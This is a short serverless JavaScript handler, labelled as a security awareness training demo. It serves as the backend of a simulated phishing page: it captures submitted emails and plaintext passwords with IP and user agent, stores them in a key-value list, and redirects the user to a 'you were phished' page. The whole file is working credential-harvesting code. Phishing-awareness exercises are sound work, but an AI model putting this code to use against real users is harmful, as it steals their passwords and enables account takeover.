// ============================================================
// SECURITY AWARENESS TRAINING DEMO
// Captures form submissions and stores them in Vercel KV so
// the trainer dashboard can display them during the live demo.
// ============================================================

import { kv } from '@vercel/kv';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password } = req.body || {};

  const entry = {
    email: email || '(empty)',
    password: password || '(empty)',
    timestamp: new Date().toISOString(),
    ip: req.headers['x-forwarded-for'] || 'unknown',
    userAgent: req.headers['user-agent'] || 'unknown'
  };

  try {
    // Push the entry to the front of a list called "captures"
    await kv.lpush('captures', JSON.stringify(entry));
    // Keep only the latest 50 entries
    await kv.ltrim('captures', 0, 49);
    console.log('[TRAINING DEMO] Capture stored:', entry.email);
  } catch (err) {
    console.error('[TRAINING DEMO] KV error:', err);
  }

  // Redirect victim to the "you were phished" reveal page
  res.writeHead(302, { Location: '/caught.html' });
  res.end();
}
